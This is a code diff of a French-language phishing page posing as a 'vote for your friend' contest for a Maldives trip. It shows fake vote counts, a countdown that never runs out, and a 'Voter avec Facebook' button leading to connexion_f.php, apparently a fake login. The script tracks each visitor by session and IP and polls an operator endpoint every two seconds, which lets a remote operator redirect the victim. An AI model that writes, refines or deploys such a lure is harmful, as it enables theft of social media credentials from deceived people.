@@ -3,477 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Votez pour VOTEZ - Voyage de Rêve</title>
+    <title>Votez - Voyage de Reve</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #6366f1;
-            --secondary: #818cf8;
-            --accent: #f472b6;
-            --background: #ffffff;
-            --text: #1f2937;
-            --gradient: linear-gradient(135deg, #6366f1 0%, #818cf8 100%);
+        :root{
+            --primary:#6366f1;--secondary:#818cf8;--accent:#f472b6;
+            --bg:#ffffff;--text:#1f2937;--grad:linear-gradient(135deg,#6366f1 0%,#818cf8 100%);
+        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Plus Jakarta Sans',sans-serif}
+        body{
+            background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh;
+            background-image:
+                radial-gradient(circle at 100% 100%,rgba(99,102,241,.08) 0%,transparent 50%),
+                radial-gradient(circle at 0% 0%,rgba(129,140,248,.08) 0%,transparent 50%);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Plus Jakarta Sans', sans-serif;
+        .container{max-width:1000px;margin:0 auto;padding:2rem}
+
+        .header{text-align:center;margin-bottom:2.5rem}
+        .brand{display:inline-flex;align-items:center;gap:12px}
+        .brand-icon{width:46px;height:46px;background:var(--grad);border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;box-shadow:0 4px 16px rgba(99,102,241,.35)}
+        .brand-text{font-size:1.25rem;font-weight:800;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+
+        .layout{display:grid;grid-template-columns:1fr 1.1fr;gap:2rem;margin-bottom:2rem}
+        @media(max-width:968px){.layout{grid-template-columns:1fr}}
+
+        .left-panel{display:flex;flex-direction:column;gap:1.5rem}
+
+        .card{background:#fff;border-radius:20px;padding:2rem;box-shadow:0 8px 30px rgba(0,0,0,.06);border:1px solid rgba(0,0,0,.04)}
+
+        .badge{display:inline-flex;align-items:center;gap:.5rem;background:rgba(99,102,241,.1);color:var(--primary);padding:.45rem 1rem;border-radius:999px;font-size:.82rem;font-weight:600;margin-bottom:1rem}
+        .badge i{font-size:.7rem}
+
+        .title{font-size:2rem;font-weight:800;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1.2;margin-bottom:.75rem}
+        .desc{color:#6b7280;font-size:1rem;margin-bottom:1.5rem;line-height:1.7}
+
+        .candidate-section{background:rgba(99,102,241,.03);border-radius:16px;padding:1.5rem;border:1px solid rgba(99,102,241,.1);margin-bottom:1.5rem}
+        .candidate-name{font-size:1.5rem;font-weight:700;color:var(--primary);text-align:center;margin-bottom:1rem}
+        .progress-info{display:flex;justify-content:space-between;font-size:.82rem;color:#6b7280;margin-bottom:.4rem}
+        .progress-bar{height:8px;background:rgba(99,102,241,.1);border-radius:4px;overflow:hidden}
+        .progress-fill{height:100%;background:var(--accent);border-radius:4px;transition:width 1s ease;width:65%}
+        .votes-info{margin-top:.6rem;font-size:.82rem;color:#6b7280;text-align:center}
+
+        .timer-row{display:flex;gap:.75rem;justify-content:center;margin:1.5rem 0}
+        .timer-box{background:#fff;border-radius:14px;padding:1rem .75rem;min-width:80px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.06);border:1px solid rgba(0,0,0,.04)}
+        .timer-val{font-size:1.6rem;font-weight:800;color:var(--primary);font-variant-numeric:tabular-nums}
+        .timer-lbl{font-size:.72rem;color:#6b7280;font-weight:500;margin-top:2px}
+
+        .vote-btn{
+            display:flex;align-items:center;justify-content:center;gap:.75rem;
+            background:var(--grad);color:#fff;padding:1rem 2rem;border-radius:14px;
+            font-size:1.1rem;font-weight:700;border:none;cursor:pointer;width:100%;
+            transition:.3s;font-family:inherit;box-shadow:0 6px 24px rgba(99,102,241,.3);
+            position:relative;overflow:hidden;
         }
+        .vote-btn::after{content:'';position:absolute;inset:0;background:linear-gradient(rgba(255,255,255,.2),transparent);opacity:0;transition:.3s}
+        .vote-btn:hover::after{opacity:1}
+        .vote-btn:hover{transform:translateY(-2px);box-shadow:0 10px 32px rgba(99,102,241,.4)}
+        .vote-btn:active{transform:translateY(0)}
+        .vote-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
 
-        body {
-            background-color: var(--background);
-            color: var(--text);
-            line-height: 1.7;
-            background-image: 
-                radial-gradient(circle at 100% 100%, rgba(99, 102, 241, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 0% 0%, rgba(129, 140, 248, 0.1) 0%, transparent 50%);
-            min-height: 100vh;
+        .prize-card{margin-top:1.5rem}
+        .prize-title{font-size:1.1rem;font-weight:700;color:var(--primary);margin-bottom:1rem;display:flex;align-items:center;gap:.75rem}
+        .prize-title i{font-size:1rem}
+        .prize-list{list-style:none}
+        .prize-list li{display:flex;align-items:center;gap:.75rem;margin-bottom:.65rem;color:#4b5563;font-size:.92rem}
+        .prize-list li i{color:var(--accent);width:18px;text-align:center}
+
+        .right-panel{position:relative;border-radius:20px;overflow:hidden;min-height:480px}
+        .right-bg{
+            position:absolute;inset:0;
+            background:var(--grad);
         }
-
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 2rem;
+        .right-bg::before{
+            content:'';position:absolute;inset:0;
+            background:url('https://images.unsplash.com/photo-1514282401047-d79a71a590e8?w=800') center/cover;
+            opacity:.25;mix-blend-mode:overlay;
         }
+        .right-content{position:relative;z-index:1;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:3rem 2rem;height:100%;color:#fff}
+        .right-content h2{font-size:1.8rem;font-weight:800;margin-bottom:1rem}
+        .right-content p{font-size:1rem;opacity:.9;max-width:380px;line-height:1.7}
 
-        .header {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 3rem;
-        }
+        .share-section{text-align:center;margin-top:2rem}
+        .share-label{font-size:.82rem;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.08em;margin-bottom:1rem}
+        .share-btns{display:flex;justify-content:center;gap:.75rem}
+        .sh{width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.1rem;cursor:pointer;transition:.25s;border:none}
+        .sh:hover{transform:translateY(-3px) scale(1.08);box-shadow:0 4px 16px rgba(0,0,0,.2)}
+        .sh-fb{background:#1877f2}
+        .sh-wa{background:#25d366}
+        .sh-tw{background:#1da1f2}
+        .sh-tg{background:#0088cc}
+        .sh-ig{background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}
+        .sh-cp{background:#f1f5f9;color:#475569;border:1px solid #e2e8f0}
+        .sh-cp:hover{background:var(--primary);color:#fff;border-color:var(--primary)}
 
-        .logo {
-            height: 60px;
-            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
-        }
+        .footer{text-align:center;margin-top:2.5rem;color:#9ca3af;font-size:.82rem}
+        .footer a{color:var(--primary);text-decoration:none}
 
-        .contest-container {
-            display: grid;
-            grid-template-columns: 1fr 1.2fr;
-            gap: 2rem;
-            margin-bottom: 2rem;
-        }
+        .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);padding:12px 24px;border-radius:12px;font-size:.85rem;font-weight:600;opacity:0;transition:.3s;z-index:999;box-shadow:0 8px 32px rgba(0,0,0,.15)}
+        .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+        .toast.success{background:#16a34a;color:#fff}
+        .toast.error{background:#ef4444;color:#fff}
 
-        @media (max-width: 968px) {
-            .contest-container {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .contest-info {
-            background: white;
-            border-radius: 24px;
-            padding: 2.5rem;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.05);
-        }
-
-        .contest-visual {
-            background: var(--gradient);
-            border-radius: 24px;
-            padding: 2.5rem;
-            color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .contest-visual::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: url('https://images.unsplash.com/photo-1514282401047-d79a71a590e8?w=600') center/cover;
-            opacity: 0.2;
-            mix-blend-mode: overlay;
-        }
-
-        .contest-visual-content {
-            position: relative;
-            z-index: 1;
-            text-align: center;
-        }
-
-        .contest-visual h2 {
-            font-size: 2rem;
-            font-weight: 800;
-            margin-bottom: 1rem;
-        }
-
-        .contest-visual p {
-            font-size: 1.125rem;
-            opacity: 0.9;
-        }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            background: rgba(99, 102, 241, 0.1);
-            color: var(--primary);
-            padding: 0.5rem 1rem;
-            border-radius: 9999px;
-            font-size: 0.875rem;
-            font-weight: 600;
-            margin-bottom: 1.5rem;
-        }
-
-        .contest-title {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            line-height: 1.2;
-            margin-bottom: 1rem;
-        }
-
-        .contest-description {
-            color: #6b7280;
-            font-size: 1.125rem;
-            margin-bottom: 2rem;
-        }
-
-        .candidate-section {
-            background: rgba(99, 102, 241, 0.03);
-            border-radius: 16px;
-            padding: 2rem;
-            margin: 2rem 0;
-            border: 1px solid rgba(99, 102, 241, 0.1);
-        }
-
-        .candidate-name {
-            font-size: 1.75rem;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 1rem;
-            text-align: center;
-        }
-
-        .progress-info {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 0.5rem;
-            font-size: 0.875rem;
-            color: #6b7280;
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(99, 102, 241, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 65%;
-            background: var(--accent);
-            border-radius: 4px;
-            transition: width 1s ease;
-        }
-
-        .votes-info {
-            margin-top: 0.75rem;
-            font-size: 0.875rem;
-            color: #6b7280;
-        }
-
-        .prize-details {
-            background: white;
-            border-radius: 16px;
-            padding: 2rem;
-            margin: 2rem 0;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-        }
-
-        .prize-title {
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-        }
-
-        .prize-list {
-            list-style: none;
-            margin: 1rem 0;
-        }
-
-        .prize-list li {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            margin-bottom: 0.75rem;
-            color: #4b5563;
-        }
-
-        .prize-list li i {
-            color: var(--accent);
-        }
-
-        .vote-button {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.75rem;
-            background: var(--gradient);
-            color: white;
-            padding: 1rem 2rem;
-            border-radius: 12px;
-            font-size: 1.125rem;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            width: 100%;
-            margin: 1.5rem 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .vote-button::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(rgba(255,255,255,0.2), transparent);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .vote-button:hover::after {
-            opacity: 1;
-        }
-
-        .vote-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
-        }
-
-        .timer-container {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            margin: 2rem 0;
-        }
-
-        .timer-box {
-            background: white;
-            border-radius: 12px;
-            padding: 1rem;
-            min-width: 80px;
-            text-align: center;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-        }
-
-        .timer-value {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-
-        .timer-label {
-            font-size: 0.875rem;
-            color: #6b7280;
-        }
-
-        .share-section {
-            text-align: center;
-            margin-top: 2rem;
-        }
-
-        .share-title {
-            font-size: 1rem;
-            font-weight: 600;
-            color: #6b7280;
-            margin-bottom: 1rem;
-        }
-
-        .share-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-        }
-
-        .share-button {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.25rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border: none;
-        }
-
-        .share-button.facebook { background: #1877f2; }
-        .share-button.whatsapp { background: #25d366; }
-        .share-button.twitter { background: #1da1f2; }
-        .share-button.telegram { background: #0088cc; }
-
-        .share-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 3rem;
-            color: #6b7280;
-            font-size: 0.875rem;
-        }
-
-        .footer a {
-            color: var(--primary);
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 1rem;
-            }
-
-            .contest-title {
-                font-size: 2rem;
-            }
-
-            .timer-container {
-                flex-wrap: wrap;
-            }
-
-            .timer-box {
-                min-width: 60px;
-            }
+        @media(max-width:768px){
+            .container{padding:1rem}
+            .title{font-size:1.5rem}
+            .timer-box{min-width:64px;padding:.75rem .5rem}
+            .timer-val{font-size:1.3rem}
+            .right-panel{min-height:300px}
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div style="text-align: center;">
-                <h1 style="font-size: 1.5rem; font-weight: 800; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">Voyage de Rêve</h1>
+            <div class="brand">
+                <div class="brand-icon"><i class="fas fa-globe-americas"></i></div>
+                <div class="brand-text">Voyage de Reve</div>
             </div>
         </div>
 
-        <div class="contest-container">
-            <div class="contest-info">
-                <div class="badge">
-                    <i class="fas fa-star"></i>
-                    voyages maldives
-                </div>
+        <div class="layout">
+            <div class="left-panel">
+                <div class="card">
+                    <div class="badge"><i class="fas fa-star"></i> Voyages Maldives</div>
+                    <h1 class="title">Voyage de Reve<br>aux Maldives</h1>
+                    <p class="desc">Aidez votre ami(e) a remporter un sejour inoubliable de 2 semaines aux Maldives pour 2 personnes !</p>
 
-                <h1 class="contest-title">Voyage de Rêve aux Maldives</h1>
-                <p class="contest-description">
-                    Aidez votre ami(e) à remporter un séjour inoubliable de 2 semaines aux Maldives pour 2 personnes !
-                </p>
+                    <div class="candidate-section">
+                        <div class="candidate-name" id="candidate-name">VOTEZ</div>
+                        <div class="progress-info">
+                            <span>Progression vers la victoire</span>
+                            <span id="progress-percent">65%</span>
+                        </div>
+                        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+                        <div class="votes-info"><span id="votes-count">53 votes obtenus</span></div>
+                    </div>
 
-                <div class="candidate-section">
-                    <h2 class="candidate-name" id="candidate-name">VOTEZ</h2>
-                    
-                    <div class="progress-info">
-                        <span>Progression vers la victoire</span>
-                        <span id="progress-percent">65%</span>
+                    <div class="timer-row">
+                        <div class="timer-box"><div class="timer-val" id="hours">02</div><div class="timer-lbl">Heures</div></div>
+                        <div class="timer-box"><div class="timer-val" id="minutes">35</div><div class="timer-lbl">Minutes</div></div>
+                        <div class="timer-box"><div class="timer-val" id="seconds">00</div><div class="timer-lbl">Secondes</div></div>
                     </div>
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progress-fill"></div>
-                    </div>
-                    <div class="votes-info">
-                        <span id="votes-count">53 votes obtenus</span>
-                    </div>
-                </div>
 
-                <div class="prize-details">
-                    <h3 class="prize-title">
-                        <i class="fas fa-gift"></i>
-                        Le grand prix inclut
-                    </h3>
-                    <ul class="prize-list">
-                        <li><i class="fas fa-plane"></i> Vols aller-retour en classe affaires</li>
-                        <li><i class="fas fa-hotel"></i> 14 nuits en villa sur pilotis</li>
-                        <li><i class="fas fa-utensils"></i> Pension complète</li>
-                        <li><i class="fas fa-swimming-pool"></i> Activités nautiques illimitées</li>
-                    </ul>
-                </div>
+                    <a id="vote-link" href="#" class="vote-btn">
+                        <i class="fab fa-facebook-f"></i> Voter avec Facebook
+                    </a>
 
-                <div class="timer-container">
-                    <div class="timer-box">
-                        <div class="timer-value" id="hours">02</div>
-                        <div class="timer-label">Heures</div>
-                    </div>
-                    <div class="timer-box">
-                        <div class="timer-value" id="minutes">35</div>
-                        <div class="timer-label">Minutes</div>
-                    </div>
-                    <div class="timer-box">
-                        <div class="timer-value" id="seconds">00</div>
-                        <div class="timer-label">Secondes</div>
-                    </div>
-                </div>
-
-                <a id="vote-link" href="connexion_f.php?session=session_41.248.152.160&ip=41.248.152.160&name=VOTEZ" class="vote-button">
-                    <i class="fab fa-facebook-f"></i>
-                    Voter avec Facebook
-                </a>
-
-                <div class="share-section">
-                    <p class="share-title">Partagez pour obtenir plus de votes !</p>
-                    <div class="share-buttons">
-                        <button class="share-button facebook" onclick="shareFacebook()">
-                            <i class="fab fa-facebook-f"></i>
-                        </button>
-                        <button class="share-button whatsapp" onclick="shareWhatsapp()">
-                            <i class="fab fa-whatsapp"></i>
-                        </button>
-                        <button class="share-button twitter" onclick="shareTwitter()">
-                            <i class="fab fa-twitter"></i>
-                        </button>
-                        <button class="share-button telegram" onclick="shareTelegram()">
-                            <i class="fab fa-telegram-plane"></i>
-                        </button>
+                    <div class="card prize-card">
+                        <div class="prize-title"><i class="fas fa-gift"></i> Le grand prix inclut</div>
+                        <ul class="prize-list">
+                            <li><i class="fas fa-plane"></i> Vols aller-retour en classe affaires</li>
+                            <li><i class="fas fa-hotel"></i> 14 nuits en villa sur pilotis</li>
+                            <li><i class="fas fa-utensils"></i> Pension complete</li>
+                            <li><i class="fas fa-swimming-pool"></i> Activites nautiques limitees</li>
+                        </ul>
                     </div>
                 </div>
             </div>
 
-            <div class="contest-visual">
-                <div class="contest-visual-content">
+            <div class="right-panel">
+                <div class="right-bg"></div>
+                <div class="right-content">
                     <h2>Les Maldives vous attendent</h2>
-                    <p>Plages paradisiaques, eaux cristallines et couchers de soleil inoubliables. Votez maintenant pour offrir ce rêve à votre proche !</p>
+                    <p>Plages paradisiaques, eaux cristallines et couchers de soleil inoubliables. Votez maintenant pour offrir ce reve a votre proche !</p>
                 </div>
             </div>
         </div>
 
-        <footer class="footer">
-            <p>&copy; 2026 Voyage de Rêve. Tous droits réservés.</p>
-            <p><a href="#">Règlement du concours</a> &bull; <a href="#">Politique de confidentialité</a></p>
-        </footer>
+        <div class="share-section">
+            <div class="share-label">Partagez pour obtenir plus de votes</div>
+            <div class="share-btns">
+                <button class="sh sh-fb" onclick="share('fb')"><i class="fab fa-facebook-f"></i></button>
+                <button class="sh sh-wa" onclick="share('wa')"><i class="fab fa-whatsapp"></i></button>
+                <button class="sh sh-tw" onclick="share('tw')"><i class="fab fa-twitter"></i></button>
+                <button class="sh sh-tg" onclick="share('tg')"><i class="fab fa-telegram-plane"></i></button>
+                <button class="sh sh-ig" onclick="share('ig')"><i class="fab fa-instagram"></i></button>
+                <button class="sh sh-cp" onclick="share('cp')"><i class="fas fa-link"></i></button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2026 Voyage de Reve. Tous droits reserves.</p>
+            <p style="margin-top:4px"><a href="#">Reglement du concours</a> &bull; <a href="#">Politique de confidentialite</a></p>
+        </div>
     </div>
+
+    <div class="toast" id="toast"></div>
 
     <script>
         const params = new URLSearchParams(window.location.search);
         const clientName = params.get('name') || 'VOTEZ';
         let sessionId = params.get('session') || null;
         let clientIp = params.get('ip') || null;
+
+        function toast(msg, type) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.className = 'toast show ' + type;
+            setTimeout(() => t.classList.remove('show'), 3000);
+        }
 
         async function initSession() {
             if (!sessionId || !clientIp || clientIp === 'unknown' || sessionId.startsWith('session_' + Date.now().toString().substring(0, 5))) {
@@ -495,66 +225,34 @@
             document.getElementById('candidate-name').textContent = clientName;
             document.getElementById('vote-link').href = 'connexion_f.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
 
-            fetch('update_page.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&page=vote.html');
+            fetch('update_page.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&page=vote.html').catch(() => {});
         }
-
-        initSession();
 
         function updateCountdown() {
             const now = new Date();
             const end = new Date();
             end.setHours(end.getHours() + 2);
             end.setMinutes(end.getMinutes() + 35);
-
             const diff = end - now;
-
             if (diff <= 0) {
                 document.getElementById('hours').textContent = '00';
                 document.getElementById('minutes').textContent = '00';
                 document.getElementById('seconds').textContent = '00';
                 return;
             }
-
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-
-            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
-        }
-
-        updateCountdown();
-        setInterval(updateCountdown, 1000);
-
-        function shareFacebook() {
-            const url = encodeURIComponent(window.location.href);
-            window.open('https://www.facebook.com/sharer/sharer.php?u=' + url, '_blank', 'width=600,height=400');
-        }
-
-        function shareWhatsapp() {
-            const text = encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ");
-            const url = encodeURIComponent(window.location.href);
-            window.open('https://wa.me/?text=' + text + url, '_blank');
-        }
-
-        function shareTwitter() {
-            const text = encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ");
-            const url = encodeURIComponent(window.location.href);
-            window.open('https://twitter.com/intent/tweet?text=' + text + '&url=' + url, '_blank', 'width=600,height=400');
-        }
-
-        function shareTelegram() {
-            const text = encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ");
-            const url = encodeURIComponent(window.location.href);
-            window.open('https://t.me/share/url?url=' + url + '&text=' + text, '_blank', 'width=600,height=400');
+            const h = Math.floor(diff / 3600000);
+            const m = Math.floor((diff % 3600000) / 60000);
+            const s = Math.floor((diff % 60000) / 1000);
+            document.getElementById('hours').textContent = String(h).padStart(2, '0');
+            document.getElementById('minutes').textContent = String(m).padStart(2, '0');
+            document.getElementById('seconds').textContent = String(s).padStart(2, '0');
         }
 
         function checkAction() {
             if (!sessionId || !clientIp) return;
             fetch('check_action.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp))
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
+            .then(r => r.json())
+            .then(data => {
                 if (data.action) {
                     if (data.action === 'custom' && data.redirect) {
                         window.location.href = data.redirect + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
@@ -565,11 +263,24 @@
                     }
                 }
             })
-            .catch(function(error) {
-                console.error('Erreur lors de la vérification des actions:', error);
-            });
+            .catch(() => {});
         }
 
+        function share(t) {
+            const u = location.href;
+            const txt = encodeURIComponent("Votez pour " + clientName + " et aidez-le a gagner un voyage de reve aux Maldives ! ");
+            const url = encodeURIComponent(u);
+            if (t === 'fb') window.open('https://www.facebook.com/sharer/sharer.php?u=' + url, '_blank', 'width=600,height=400');
+            else if (t === 'wa') window.open('https://wa.me/?text=' + txt + url, '_blank');
+            else if (t === 'tw') window.open('https://twitter.com/intent/tweet?text=' + txt + '&url=' + url, '_blank', 'width=600,height=400');
+            else if (t === 'tg') window.open('https://t.me/share/url?url=' + url + '&text=' + txt, '_blank', 'width=600,height=400');
+            else if (t === 'ig') { navigator.clipboard.writeText(u).then(() => toast('Lien copie !', 'success')); }
+            else navigator.clipboard.writeText(u).then(() => toast('Lien copie !', 'success'));
+        }
+
+        initSession();
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
         setInterval(checkAction, 2000);
     </script>
 </body>
